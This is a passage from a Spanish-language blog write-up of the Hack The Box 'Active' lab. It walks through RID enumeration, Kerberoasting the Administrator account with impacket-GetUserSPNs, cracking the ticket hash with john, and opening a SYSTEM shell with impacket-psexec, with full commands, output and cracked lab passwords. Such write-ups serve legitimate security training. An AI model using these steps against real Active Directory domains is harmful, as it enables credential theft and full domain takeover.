+group:[Domain Admins] rid:[0x200]
+group:[Domain Users] rid:[0x201]
+group:[Domain Guests] rid:[0x202]
+group:[Domain Computers] rid:[0x203]
+group:[Domain Controllers] rid:[0x204]
+group:[Schema Admins] rid:[0x206]
+group:[Enterprise Admins] rid:[0x207]
+group:[Group Policy Creator Owners] rid:[0x208]
+group:[Read-only Domain Controllers] rid:[0x209]
+group:[DnsUpdateProxy] rid:[0x44e]
+rpcclient $&gt; querygroupmem 0x200
+        rid:[0x1f4] attr:[0x7]
+</span></code></pre></div></div>
+
+<p>Vemos que el único usuario dentro del grupos <code class="language-plaintext highlighter-rouge">Admins</code> es <code class="language-plaintext highlighter-rouge">Administrator</code>. Ahora, con la utilidad <code class="language-plaintext highlighter-rouge">impacket-GetUserSPNs</code> podemos solicitar un TGS, en este caso del usuario <strong>Administrator</strong>. (<strong>Nota</strong>: En caso de obtener el error <code class="language-plaintext highlighter-rouge">Kerberos SessionError</code>, nos instalamos <code class="language-plaintext highlighter-rouge">rdate</code> para sincronizar nuestro relog con el Domain Controller <code class="language-plaintext highlighter-rouge">rdate -n 10.10.10.100</code>)
+.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ impacket-GetUserSPNs <span class="nt">-dc-ip</span> 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18 <span class="nt">-request</span> <span class="nt">-output</span> tgs.hash
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
+<span class="nt">--------------------</span>  <span class="nt">-------------</span>  <span class="nt">--------------------------------------------------------</span>  <span class="nt">--------------------------</span>  <span class="nt">--------------------------</span>  <span class="nt">----------</span>
+active/CIFS:445       Administrator  <span class="nv">CN</span><span class="o">=</span>Group Policy Creator Owners,CN<span class="o">=</span>Users,DC<span class="o">=</span>active,DC<span class="o">=</span>htb  2018-07-18 14:06:40.351723  2021-01-21 10:07:03.723783
+</code></pre></div></div>
+
+<p>Como ya tenemos un hash dentro del archivo <code class="language-plaintext highlighter-rouge">tgs.hash</code>, ya debemos estar pensando en <code class="language-plaintext highlighter-rouge">john</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ john <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt tgs.hash
+Using default input encoding: UTF-8
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>krb5tgs, Kerberos 5 TGS etype 23 <span class="o">[</span>MD4 HMAC-MD5 RC4]<span class="o">)</span>
+Will run 8 OpenMP threads
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+Ticketmaster1968 <span class="o">(</span>?<span class="o">)</span>
+1g 0:00:00:47 DONE <span class="o">(</span>2021-12-05 22:30<span class="o">)</span> 0.02121g/s 223568p/s 223568c/s 223568C/s Tiffani1432..Thehunter22
+Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
+Session completed
+</code></pre></div></div>
+
+<p>Ya tenemos la contraseña del usuario <strong>Administrator</strong> del dominio y podemos conectarnos a la máquina:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ impacket-psexec active.htb/Administrator:Ticketmaster1968@10.10.10.100
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting shares on 10.10.10.100.....
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found writable share ADMIN<span class="err">$</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploading file vzDHsSZG.exe
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Opening SVCManager on 10.10.10.100.....
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Creating service DVAK on 10.10.10.100.....
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting service DVAK.....
+<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
+Microsoft Windows <span class="o">[</span>Version 6.1.7601]
+Copyright <span class="o">(</span>c<span class="o">)</span> 2009 Microsoft Corporation.  All rights reserved.
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami
+nt authority<span class="se">\s</span>ystem
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
+</code></pre></div></div>
+
+<p>Nos encontramos dentro de la máquina como el usuario <code class="language-plaintext highlighter-rouge">nt authority\system</code> y podemos visualizar las flags (user.txt y root.txt).</p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#active-directory" class="page__taxonomy-item" rel="tag">Active_Directory</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#kerberoasting" class="page__taxonomy-item" rel="tag">Kerberoasting</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#powershell" class="page__taxonomy-item" rel="tag">Powershell</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#windows" class="page__taxonomy-item" rel="tag">Windows</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#easy" class="page__taxonomy-item" rel="tag">Easy</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#windows" class="page__taxonomy-item" rel="tag">Windows</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2021-12-05T00:00:00-06:00">December 05, 2021</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/htb-nineveh/" class="pagination--pager" title="Hack The Box Nineveh
+">Previous</a>
+    
+    
+      <a href="#" class="pagination--pager disabled">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2021 K4miyo</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
